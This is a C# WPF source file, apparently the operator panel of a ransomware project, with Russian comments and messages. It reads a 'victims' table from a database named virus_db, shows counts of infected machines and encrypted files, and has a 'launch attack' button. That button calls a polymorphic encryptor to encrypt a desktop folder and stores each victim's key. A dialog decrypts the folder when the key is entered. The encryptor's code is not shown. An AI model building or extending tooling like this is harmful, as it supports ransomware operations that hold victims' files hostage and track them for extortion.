using System;
using System.IO;
using System.Linq;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Media;
using CP.Services;

namespace CP
{
    public partial class MainWindow : Window
    {
        private string lastEncryptionKey = "";

        public MainWindow()
        {
            InitializeComponent();
            LoadVictimsData();
            UpdateStatistics();
        }

        private void LoadVictimsData()
        {
            try
            {
                // Используйте virus_dbEntities2 (не system_cacheEntities!)
                using (var context = new virus_dbEntities2())
                {
                    // Используйте 'victims' (DbSet) и свойства в lowercase
                    var victims = context.victims
                        .OrderByDescending(v => v.infected_time)
                        .ToList();

                    dgVictims.ItemsSource = victims;
                    txtStatus.Text = $"Last update: {DateTime.Now:HH:mm:ss}";
                }
            }
            catch (Exception ex)
            {
                ShowDemoData();
                txtStatus.Text = $"Demo mode | DB error: {ex.Message}";
            }
        }

        private void ShowDemoData()
        {
            // Создайте демо-данные с правильными именами свойств
            var demoVictims = new System.Collections.Generic.List<victim>
            {
                new victim
                {
                    computer_name = "DESKTOP-DEMO1",
                    user_name = "Admin",
                    // ip_address и files_encrypted нет в вашей БД!
                    files_count = 25,
                    infected_time = DateTime.Now.AddHours(-3),
                    status = "active",
                    encryption_key = "demo_key_abc123"
                },
                new victim
                {
                    computer_name = "LAPTOP-DEMO2",
                    user_name = "User",
                    files_count = 12,
                    infected_time = DateTime.Now.AddHours(-1),
                    status = "decrypted",
                    encryption_key = "demo_key_def456"
                }
            };

            dgVictims.ItemsSource = demoVictims;
        }

        private void UpdateStatistics()
        {
            try
            {
                using (var context = new virus_dbEntities2())
                {
                    int totalVictims = context.victims.Count();
                    int infectedCount = context.victims.Count(v => v.status == "active");
                    int totalFiles = context.victims.Sum(v => v.files_count ?? 0);

                    txtStats.Text = $"Total victims: {totalVictims}";
                    txtInfectedStats.Text = $"Currently infected: {infectedCount}";
                    txtFilesStats.Text = $"Total files encrypted: {totalFiles}";
                }
            }
            catch
            {
                txtStats.Text = "Total victims: 2 (demo)";
                txtInfectedStats.Text = "Currently infected: 1 (demo)";
                txtFilesStats.Text = "Total files encrypted: 37 (demo)";
            }
        }

        private void BtnLaunchAttack_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                MessageBoxResult result = MessageBox.Show(
                    "Запустить тестовую атаку?\n\n" +
                    "Файлы в целевой папке будут зашифрованы для демонстрации.",
                    "Тестовая атака",
                    MessageBoxButton.YesNo,
                    MessageBoxImage.Warning);

                if (result == MessageBoxResult.Yes)
                {
                    var encryptor = new PolymorphicEncryptorService();
                    var victimService = new VictimManagerService();

                    // Создаем жертву
                    var victim = victimService.CreateNewVictim();
                    lastEncryptionKey = encryptor.GeneratePolymorphicKey();

                    // Шифруем файлы
                    string targetDir = @"C:\Users\admin\Desktop\files";
                    int encryptedCount = encryptor.EncryptVictimFiles(targetDir, lastEncryptionKey);

                    // Обновляем жертву
                    victim.encryption_key = lastEncryptionKey;
                    victim.files_count = encryptedCount;

                    // Сохраняем в БД
                    using (var context = new virus_dbEntities2())
                    {
                        context.victims.Add(victim);
                        context.SaveChanges();
                    }

                    // Обновляем интерфейс
                    txtLastKey.Text = lastEncryptionKey;
                    LoadVictimsData();
                    UpdateStatistics();

                    MessageBox.Show(
                        $"✅ Атака завершена!\n\n" +
                        $"📊 Зашифровано файлов: {encryptedCount}\n" +
                        $"🔑 Ключ: {lastEncryptionKey}",
                        "Готово",
                        MessageBoxButton.OK,
                        MessageBoxImage.Information);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"❌ Ошибка: {ex.Message}", "Ошибка",
                              MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private void BtnRestoreFiles_Click(object sender, RoutedEventArgs e)
        {
            // Простое окно ввода
            var inputWindow = new Window
            {
                Title = "Введите ключ",
                Width = 400,
                Height = 180,
                WindowStartupLocation = WindowStartupLocation.CenterOwner,
                Owner = this
            };

            var textBox = new TextBox
            {
                Text = lastEncryptionKey,
                Margin = new Thickness(20, 40, 20, 10),
                Height = 30,
                FontSize = 14
            };

            var button = new Button
            {
                Content = "РАСШИФРОВАТЬ",
                Width = 120,
                Height = 35,
                Margin = new Thickness(20, 10, 20, 20),
                Background = Brushes.Green,
                Foreground = Brushes.White,
                FontWeight = FontWeights.Bold
            };

            var label = new Label
            {
                Content = "Введите ключ шифрования:",
                Margin = new Thickness(20, 20, 20, 0),
                FontSize = 14,
                FontWeight = FontWeights.Bold
            };

            string result = null;
            button.Click += (s, args) =>
            {
                result = textBox.Text;
                inputWindow.DialogResult = true;
                inputWindow.Close();
            };

            var grid = new Grid();
            grid.Children.Add(label);
            grid.Children.Add(textBox);
            grid.Children.Add(button);

            inputWindow.Content = grid;
            textBox.Focus();
            textBox.SelectAll();

            if (inputWindow.ShowDialog() == true && !string.IsNullOrEmpty(result))
            {
                try
                {
                    string inputKey = result;
                    var encryptor = new PolymorphicEncryptorService();
                    int decryptedCount = 0;

                    // Дешифруем файлы
                    string targetPath = @"C:\Users\admin\Desktop\files";
                    if (Directory.Exists(targetPath))
                    {
                        decryptedCount = encryptor.DecryptVictimFiles(targetPath, inputKey);
                    }

                    // Обновляем статус в БД
                    using (var context = new virus_dbEntities2())
                    {
                        var victim = context.victims.FirstOrDefault(v => v.encryption_key == inputKey);
                        if (victim != null)
                        {
                            victim.status = "decrypted";
                            context.SaveChanges();
                        }
                    }

                    LoadVictimsData();
                    UpdateStatistics();

                    MessageBox.Show(
                        $"✅ Файлы восстановлены!\n\n" +
                        $"📊 Расшифровано файлов: {decryptedCount}",
                        "Готово",
                        MessageBoxButton.OK,
                        MessageBoxImage.Information);
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"❌ Ошибка: {ex.Message}", "Ошибка",
                                  MessageBoxButton.OK, MessageBoxImage.Error);
                }
            }
        }

        // Остальные методы без изменений
        private void BtnCopyTools_Click(object sender, RoutedEventArgs e) { /* ... */ }
        private void BtnRefresh_Click(object sender, RoutedEventArgs e) { LoadVictimsData(); UpdateStatistics(); }
        private void BtnShowFolder_Click(object sender, RoutedEventArgs e) { /* ... */ }
    }
}